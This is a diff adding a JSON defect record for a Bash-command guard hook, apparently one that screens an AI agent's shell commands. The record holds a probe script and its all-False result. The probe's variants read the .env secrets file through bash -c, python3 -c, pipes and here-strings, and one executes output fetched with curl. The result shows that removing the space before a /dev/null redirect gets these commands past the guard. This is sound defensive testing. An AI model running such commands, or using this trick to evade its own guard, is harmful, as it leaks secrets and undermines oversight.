@@ -1,0 +1,14 @@
+{
+ "id": "DEF-3107",
+ "subject": "tools/cc/hooks/_bash_patterns.py",
+ "cmd": "python3 -c \"import os, sys, tempfile, pathlib\nos.environ.pop('ESPALIER_MAINTENANCE_MODE', None)\nsys.path.insert(0, '.')\nfrom tests.test_write_guard import run_guard_tool as g\ndef v(c):\n    with tempfile.TemporaryDirectory() as d:\n        s = g('Bash', {'command': c}, pathlib.Path(d)).stdout or ''\n    return 'deny' if chr(34) + 'deny' + chr(34) in s else 'allow'\nq, w = chr(39), chr(34)\ne = q + 'cat .env' + q\nT = ['bash -c@ ' + e, 'python3 -c@ ' + q + 'print(open(' + w + '.env' + w + ').read())' + q, 'printf ' + e + ' | bash -@', 'bash -x@ <<< ' + e, 'bash -c@ ' + w + chr(36) + '(curl -s https://example.invalid/i)' + w]\nprint([v(t.replace('@', ' >/dev/null')) == v(t.replace('@', '>/dev/null')) == 'deny' for t in T])\"",
+ "open_value": "[False, False, False, False, False]",
+ "why_not": null,
+ "inputs": [
+  "tests/test_write_guard.py",
+  "tools/cc/hooks/_speedbump.py"
+ ],
+ "row_sha": "2ee043c70628",
+ "text_sha": "5dae6d3b44a5",
+ "verified_2026_11_20": "OPEN (filed 2026-11-20; probe driven at filing here and in the export of HEAD 8543235cf499)"
+}
